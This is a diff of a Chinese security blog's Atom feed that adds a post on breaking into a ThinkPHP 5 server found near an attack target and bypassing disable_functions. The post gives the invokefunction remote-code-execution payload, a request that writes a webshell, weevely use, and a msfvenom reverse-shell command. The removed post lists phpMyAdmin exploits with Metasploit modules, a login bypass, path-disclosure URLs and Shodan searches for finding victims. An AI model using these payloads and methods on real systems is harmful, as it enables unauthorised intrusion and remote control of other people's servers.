@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-04-05T04:53:25.283Z</updated>
+  <updated>2019-04-09T13:27:49.500Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,36 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一次disable_functions绕过</title>
+    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2019/04/09/%E4%B8%80%E6%AC%A1disable-functions%E7%BB%95%E8%BF%87.html"/>
+    <id>http://yoursite.com/渗透/2019/04/09/一次disable-functions绕过.html</id>
+    <published>2019-04-09T13:14:34.000Z</published>
+    <updated>2019-04-09T13:27:49.500Z</updated>
+    
+    <content type="html"><![CDATA[<p>　　一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标<a href="http://xxxxx.com/index/login/index.html" target="_blank" rel="external">http://xxxxx.com/index/login/index.html</a><br><img src="https://i.loli.net/2019/04/09/5cac9b5490cd9.png" alt="1.png"><a id="more"></a><br><img src="https://i.loli.net/2019/04/09/5cac9b548339a.png" alt="2.png"></p>
+<p>　　直接使用EXP测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/09/5cac9b54a373a.png" alt="3.png"><br>　　写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/09/5cac9b54bc8cb.png" alt="4.png"><br><img src="https://i.loli.net/2019/04/09/5cac9b54da1c9.png" alt="5.png"><br>　　一看disable_functions，这么多被禁用了。<br><img src="https://i.loli.net/2019/04/09/5cac9b54b061e.png" alt="6.png"><br><strong>方法一：</strong><br>　　一般这样我先使用的是<strong>weevely</strong>，即使禁用一些函数，可以执行一下常见的命令，工具也比较好，这里值得推荐大家使用，网上也有好多教程，操作比较简单。<br><img src="https://i.loli.net/2019/04/09/5cac9b54cb57e.png" alt="8.png"><br><img src="https://i.loli.net/2019/04/09/5cac9b54b9360.png" alt="9.png"><br>　　可以执行一些简单的命令，但是一些跨目录什么的不能执行，换一种方法试试。</p>
+<p><strong>方法二：</strong><br>　　发现存在–enable-pcntl，可以尝试使用pcntl_exec绕过。pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求： PHP 4 &gt;= 4.2.0, PHP 5 on linux。<br><img src="https://i.loli.net/2019/04/09/5cac9b54c3779.png" alt="7.png"><br>　　这里我使用weevely远程下载pcntl_exec执行反弹shell，也可以直接上传文件，使用help或者table按键可以查看weevely的一些命令。<br><img src="https://i.loli.net/2019/04/09/5cac9c8872453.png" alt="11.png"><br>　　但是还是有一些命令不能执行。<br><img src="https://i.loli.net/2019/04/09/5cac9c885f867.png" alt="12.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c884dd12.png" alt="13.png"><br><strong>方法三：</strong><br>　　使用MSF生成elf文件，不依赖于php，可以执行命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxxx LPORT=4444 -f elf &gt; shell.elf</div></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/04/09/5cac9c8856fab.png" alt="15.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c8838a03.png" alt="16.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c886f03b.png" alt="17.png"><br>　　这一次终于绕过可以执行任意命令了。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;　　一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标&lt;a href=&quot;http://xxxxx.com/index/login/index.html&quot;&gt;http://xxxxx.com/index/login/index.html&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cac9b5490cd9.png&quot; alt=&quot;1.png&quot;&gt;
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="实战" scheme="http://yoursite.com/tags/%E5%AE%9E%E6%88%98/"/>
+    
+  </entry>
   
   <entry>
     <title>一次曲折的注入</title>
@@ -145,9 +175,9 @@
       <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
       <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
@@ -1289,9 +1319,9 @@
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
       <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -1548,75 +1578,6 @@ expect:// — 处理交互式的流
       &lt;p&gt;　　通过上节的测试阶段，我们已经掌握了一批具有PhpMyadmn页面的URL。我们现在就是需要登录到里面，继而进一步进行我们想要的操作。&lt;/p&gt;
 &lt;h3 id=&quot;0x01-获取root账号&quot;&gt;&lt;a href=&quot;#0x01-获取root账号&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取root账号&quot;&gt;&lt;/a&gt;0x01 获取root账号&lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;1.1 暴力破解&lt;br&gt;　　可以使用&lt;a href=&quot;http://pan.baidu.com/s/1c1LD6co&quot;&gt;phpmyadmin多线程批量破解工具&lt;/a&gt;进行批量破解，这里我们需要的就是强大的密码字典以及常用的phpmyadmin用户名。或者使用Burp进行抓包暴力破解。
-    
-    </summary>
-    
-      <category term="测试" scheme="http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PhpMyadmin分析（一）</title>
-    <link href="http://yoursite.com/%E6%B5%8B%E8%AF%95/2017/04/03/PhpMyadmin%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89.html"/>
-    <id>http://yoursite.com/测试/2017/04/03/PhpMyadmin分析（一）.html</id>
-    <published>2017-04-03T03:10:06.000Z</published>
-    <updated>2017-04-03T12:23:29.645Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x01-PhpMyadmin"><a href="#0x01-PhpMyadmin" class="headerlink" title="0x01 PhpMyadmin"></a>0x01 PhpMyadmin</h3><p>　　Phpmyadmin是一款以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，通过提供的mysql数据库用户账号和密码对所管理的数据库实施操作。在渗透过程中，一旦获取其mysql账号和对应的密码，轻者获取其账号所管理数据库，重者可以配合其它漏洞获取webshell权限和系统权限。</p>
-<h3 id="0x02-PhpMyadmin各版本漏洞"><a href="#0x02-PhpMyadmin各版本漏洞" class="headerlink" title="0x02 PhpMyadmin各版本漏洞"></a>0x02 PhpMyadmin各版本漏洞</h3><p>一、影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG<a id="more"></a><br>　　概述：PhpMyAdmin存在PREG_REPLACE_EVAL漏洞<br>　　利用模块：exploit/multi/http/phpmyadmin_preg_replace<br>　　CVE: CVE-2013-3238</p>
-<p>二、影响版本：phpMyAdmin v3.5.2.2<br>　　概述：PhpMyAdmin存在server_sync.php 后门漏洞<br>　　利用模块：exploit/multi/http/phpmyadmin_3522_backdoor<br>　　CVE: CVE-2012-5159</p>
-<p>三、影响版本： 2.11.x    &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1;<br>　　概述：PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>　　利用模块：exploit/unix/webapp/phpmyadmin_config<br>　　CVE: CVE-2009-1151</p>
-<p>四、影响版本：2.11.3 / 2.11.4<br>　　利用方法：用户名处写入’localhost’@’@”则登录成功。 (注意全部是英文标点符号，最后一个为英文双引号)</p>
-<h3 id="0x03-附上几个php爆绝对路径的办法"><a href="#0x03-附上几个php爆绝对路径的办法" class="headerlink" title="0x03 附上几个php爆绝对路径的办法"></a>0x03 附上几个php爆绝对路径的办法</h3><ul>
-<li><p>1、单引号爆路径<br>直接在URL后面添加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   www.xxx.com/news.php?id=149&apos;</div></pre></td></tr></table></figure>
-</li>
-<li><p>2、错误参数值爆路径<br>将要提交的参数值改成错误值，比如-1。单引号被过滤时不妨试试。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   www.xxx.com/news.php?id=-1</div></pre></td></tr></table></figure>
-</li>
-<li><p>3、Google爆路径<br>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   site:xxx.com warning     </div><div class="line">   site:xxx.com &quot;fatal error&quot;</div></pre></td></tr></table></figure>
-</li>
-<li><p>4、测试文件爆路径<br>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()，可以先使用御剑等目录扫描工具进行扫描。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">EG：</div><div class="line">   www.xxx.com/test.php</div><div class="line">   www.xxx.com/ceshi.php</div><div class="line">   www.xxx.com/info.php</div><div class="line">   www.xxx.com/phpinfo.php</div><div class="line">   www.xxx.com/php_info.php</div><div class="line">   www.xxx.com/1.php</div></pre></td></tr></table></figure>
-</li>
-<li><p>5、phpmyadmin爆路径<br>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">EG:</div><div class="line">   www.xxx.com/phpMyAdmin/libraries/select_lang.lib.php</div><div class="line">   www.xxx.com/phpMyAdmin/darkblue_orange/layout.inc.php</div><div class="line">   www.xxx.com/phpMyAdmin/index.php?lang[]=1</div><div class="line">   www.xxx.com/phpmyadmin/themes/darkblue_orange/layout.inc.php</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<ul>
-<li><p>6、配置文件找路径<br>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Windows:</div><div class="line">   c:\windows\php.ini php配置文件</div><div class="line">   c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</div><div class="line">Linux:</div><div class="line">   /etc/php.ini php配置文件</div><div class="line">   /etc/httpd/conf.d/php.conf</div><div class="line">   /etc/httpd/conf/httpd.conf Apache配置文件</div><div class="line">   /usr/local/apache/conf/httpd.conf</div><div class="line">   /usr/local/apache2/conf/httpd.conf</div><div class="line">   /usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</div></pre></td></tr></table></figure>
-</li>
-<li><p>7、nginx文件类型错误解析爆路径<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EG:</div><div class="line">   www.xxx.com/top.jpg/x.php</div></pre></td></tr></table></figure>
-</li>
-<li><p>8、通过mysql查询<br>　　select @@datadir;<br><img src="http://i4.buimg.com/567571/0a5af818ecaa1d66.jpg" alt=""></p>
-<h3 id="0X04-获取PhpMyadmin信息"><a href="#0X04-获取PhpMyadmin信息" class="headerlink" title="0X04 获取PhpMyadmin信息"></a>0X04 获取PhpMyadmin信息</h3><p>　　想要利用PhpMyadmin的漏洞，那么首先就要知道那些网站或者URL中存在PhpMyadmin，这个是重中之重，除了谷歌和百度，这里只要介绍两个很重要的搜索引擎<a href="https://www.zoomeye.org/" target="_blank" rel="external"><strong>Zoomeye</strong></a>和<a href="https://exploits.shodan.io" target="_blank" rel="external"><strong>Shodan</strong></a>。</p>
-</li>
-</ul>
-<h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>　　Shodan被称为“世界上最可怕的搜索引擎”，Shodan通过来自各种设备的HTTP header以及其它标志性信息进行检索。Shodan可以收集这些设备的信息，并根据其所属国家、操作系统、品牌以及许多其它属性进行分类。而谷歌、百度等搜索引擎通过引用返回的内容进行检索，是网站内容搜索。我们可以注册账号进行搜索，进行免费的使用，Shodan搜索方法比较简单，大家可以自行尝试。</p>
-<ul>
-<li>1.1　关键字搜索<br>　　搜索方法比较简单，直接在搜索框输入“phpmyadmin”，系统就会自动进行搜索。<br><img src="http://i2.muimg.com/567571/59d4db78a9c1d2c3.jpg" alt=""></li>
-<li>1.2  多关键词搜索<br>　　在shodan搜索引擎中默认按照“TOP COUNTRIES”、“TOP SERVICES”、“TOP ORGANIZATIONS”、“TOP OPERATINGSYSTEMS”和“TOP PRODUCTS”五种类型进行显示，免费用户只能搜索前五页结果。不登录的话，只能看到一些简单的结果。<br>　　我们可以在搜索关键字中加入国家进行搜索，也可以在左边的地图上进行点选。例如以下关键字：phpMyAdmin country:”CN” product:”Apache httpd” 表示搜索关键字“phpMyAdmin”，国家为中国，产品类型为“Apachehttpd”。<br><img src="http://i4.buimg.com/567571/d7ee38017c3b1c06.jpg" alt=""></li>
-<li>1.3 搜索结果<br>　　搜索结果记录中可以看到每一个记录中都会包含“phpMyAdmin”，然后在下面有一个Details，单击该链接会显示有关该IP端口开放等详细信息，在该信息中默认还会以地图方式显示该IP可能的地理信息。<br><img src="http://i2.muimg.com/567571/5f19d114bc2f7dea.jpg" alt=""></li>
-</ul>
-<h4 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h4><p>　　Zoomeye是知道创宇开放了他们的海量数据库，对之前沉淀的数据进行了整合、整理，打造了一个名符其实的网络空间搜索引擎，除了联网设备还可搜索网站组件，可以用来对web服务进行细节分析。</p>
-<ul>
-<li>1.1 普通搜索<br>　　直接主页面输入我们想要搜索的内容。<br><img src="http://i1.piimg.com/567571/6bb246ec33882fdd.jpg" alt=""></li>
-<li>1.2 高级搜索<br>　　比如discuz的一个古老的漏洞，discuz X1.5版本，存在sql注入，可以利用sql注入上传文件，最终拿下服务器。<br><img src="http://i1.piimg.com/567571/64fe0c937f2f30ba.jpg" alt=""></li>
-</ul>
-<p>　　经过上面两个搜索引擎，我们可以找到一系列存在phpmyadmin的网站。</p>
-<h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>　　经过上面的几步，我们已经得到了我们的目标，那么就可以进行下面的渗透操作了。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x01-PhpMyadmin&quot;&gt;&lt;a href=&quot;#0x01-PhpMyadmin&quot; class=&quot;headerlink&quot; title=&quot;0x01 PhpMyadmin&quot;&gt;&lt;/a&gt;0x01 PhpMyadmin&lt;/h3&gt;&lt;p&gt;　　Phpmyadmin是一款以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，通过提供的mysql数据库用户账号和密码对所管理的数据库实施操作。在渗透过程中，一旦获取其mysql账号和对应的密码，轻者获取其账号所管理数据库，重者可以配合其它漏洞获取webshell权限和系统权限。&lt;/p&gt;
-&lt;h3 id=&quot;0x02-PhpMyadmin各版本漏洞&quot;&gt;&lt;a href=&quot;#0x02-PhpMyadmin各版本漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x02 PhpMyadmin各版本漏洞&quot;&gt;&lt;/a&gt;0x02 PhpMyadmin各版本漏洞&lt;/h3&gt;&lt;p&gt;一、影响版本：3.5.x &amp;lt; 3.5.8.1 and 4.0.0 &amp;lt; 4.0.0-rc3 ANYUN.ORG
     
     </summary>
     
